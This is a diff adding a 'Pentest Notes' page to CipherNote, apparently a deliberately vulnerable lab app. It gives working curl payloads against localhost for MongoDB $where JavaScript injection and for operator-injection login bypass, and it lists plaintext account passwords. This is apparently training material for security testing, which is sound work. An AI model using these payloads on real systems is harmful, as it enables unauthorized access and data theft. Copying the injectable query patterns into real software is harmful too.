@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}}</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/"><span class="logo-icon">📓</span>Cipher<span>Note</span></a>
+  <nav>
+    <a href="/search">Search</a>
+    {{if .User}}<a href="/logout">Sign Out</a>{{else}}<a href="/login" class="btn-nav">Sign In</a>{{end}}
+  </nav>
+</header>
+
+<main>
+  <div class="docs-wrap">
+    <h1>Pentest Notes – CipherNote</h1>
+    <p class="docs-intro">Exploitation reference for security assessment. App1 – VULN-A and VULN-B (NoSQL injection).</p>
+
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="vuln-id">VULN-A</span>
+        <span class="vuln-type">Detecting NoSQL Injection</span>
+      </div>
+      <p><strong>Endpoint:</strong> <code>GET /search?q=&lt;value&gt;</code></p>
+      <p><strong>Mechanism:</strong> The <code>q</code> parameter is interpolated into a MongoDB <code>$where</code> JavaScript expression without escaping. Injecting JS operators alters query behaviour in detectable ways.</p>
+      <p><strong>Detection technique 1 – Syntax error:</strong></p>
+      <pre><code># Single quote breaks JS string → MongoDB returns an error
+curl "http://localhost:8081/search?q='"
+# Response: "Search could not be completed: ..."
+# → Confirms the value is evaluated as JavaScript</code></pre>
+      <p><strong>Detection technique 2 – Boolean bypass (returns all notes incl. private):</strong></p>
+      <pre><code># Normal search – only matching public notes returned
+curl "http://localhost:8081/search?q=governance"
+
+# Injected – always-true condition returns ALL notes (including private)
+# URL-encode the payload: test') || (1==1) &amp;&amp; ('
+curl "http://localhost:8081/search?q=test%27)%20%7C%7C%20(1%3D%3D1)%20%26%26%20(%27"</code></pre>
+      <p><strong>Detection technique 3 – Time delay:</strong></p>
+      <pre><code># 3-second server delay confirms code execution
+curl -w "\nTime: %{time_total}s\n" \
+  "http://localhost:8081/search?q=test%27)%3B%20sleep(3000)%3B%20(%27"</code></pre>
+      <p><strong>Why it works:</strong> <code>$where</code> evaluates a JavaScript function on every document. User input is interpolated directly into the JS string via <code>fmt.Sprintf</code> with no escaping.</p>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="vuln-id">VULN-B</span>
+        <span class="vuln-type">NoSQL Operator Injection – Auth Bypass</span>
+      </div>
+      <p><strong>Endpoint:</strong> <code>POST /login</code> — <code>Content-Type: application/json</code></p>
+      <p><strong>Mechanism:</strong> The JSON body is decoded into <code>interface{}</code> fields. When the <code>password</code> value is a JSON object like <code>{"$ne": null}</code>, the Go mongo-driver serialises it as a BSON operator, making the filter match <em>any</em> user with a non-null password.</p>
+      <pre><code># Bypass as admin (specific user, any password)
+curl -s -X POST http://localhost:8081/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":{"$ne":null}}'
+
+# Bypass as first user in collection (no username needed)
+curl -s -X POST http://localhost:8081/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":{"$gt":""},"password":{"$gt":""}}'
+
+# Password regex match (matches any password)
+curl -s -X POST http://localhost:8081/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"editor","password":{"$regex":".*"}}'</code></pre>
+      <p><strong>Why it works:</strong> <code>json.Unmarshal</code> decodes <code>{"$ne": null}</code> into <code>map[string]interface{}{"$ne": nil}</code>. When this is placed in a <code>bson.D</code> element, the Go driver renders it as the BSON operator <code>{$ne: null}</code>, turning an equality check into an inequality check that matches everything.</p>
+    </div>
+
+    <div class="info-box">
+      <strong>Database:</strong> app1_db &nbsp;|&nbsp;
+      <strong>Collections:</strong> users (username, password, role), notes (title, content, public) &nbsp;|&nbsp;
+      <strong>Accounts:</strong> admin / S3cr3t_P@ss | editor / Ed1t0r!24 | viewer / V1ewer#2024
+    </div>
+  </div>
+</main>
+
+<footer>
+  <p>© 2024 CipherNote &nbsp;|&nbsp; <a href="/docs">Security Notes</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
